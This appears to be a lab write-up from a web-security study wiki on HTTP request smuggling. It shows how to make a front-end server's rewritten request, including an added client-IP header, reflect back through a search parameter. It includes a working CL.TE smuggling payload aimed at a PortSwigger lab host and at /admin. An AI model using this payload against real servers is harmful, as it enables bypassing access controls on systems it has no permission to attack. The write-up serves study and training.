---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Front-end request rewriting

Many applications have front end servers performing rewrites before forwarding requests to the backend server usually adding additional headers to the http request. Such as adding `X-Forwarded-For`, `X-Forwarded-Proto`, and `X-Forwarded-Host` headers.

Original request sent by user to reset password

```http
POST /reset HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

email=bob@example.com
```

Additional headers will be added to provide more information about the original request before it is being forwarded to backend server

```http
POST /reset HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
X-Forwarded-For: 192.168.0.1
X-Forwarded-Proto: https
X-Forwarded-Host: example.com

email=bob@example.com
```

Sometimes smuggled request will be missing the additional headers added during the rewriting of request by the front end server, thus making the intended smuggled request fail. So for the smuggled request to succeed, we must be able to find out the additional headers that were added and add them to the smuggled request

## How?

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

* Find a POST request that reflects the value of a request parameter into the application's response.
* Shuffle the parameters so that the reflected parameter appears **last** in the message body.
* Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

For example the request below, the search parameter will contain the smuggled request so that we can reflect the modifed request via the response

```http
POST / HTTP/1.1
Host: 0ae8002e042489af801dcb43004500da.web-security-academy.net
Content-Length:198
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0ae8002e042489af801dcb43004500da.web-security-academy.net
Content-Length: 300

search=GET /admin HTTP/1.1
Host: 0ae8002e042489af801dcb43004500da.web-security-academy.net
X-xFCnVm-Ip: 218.212.3.153
```

We can see the modified request via the reponse that is reflected using the search parameter which gives us the headers that were added by the front-end. Using this, we can indentify and add this header to our smuggled request and perform the usual HTTP request smuggling technique.

![](<../.gitbook/assets/image (37).png>)
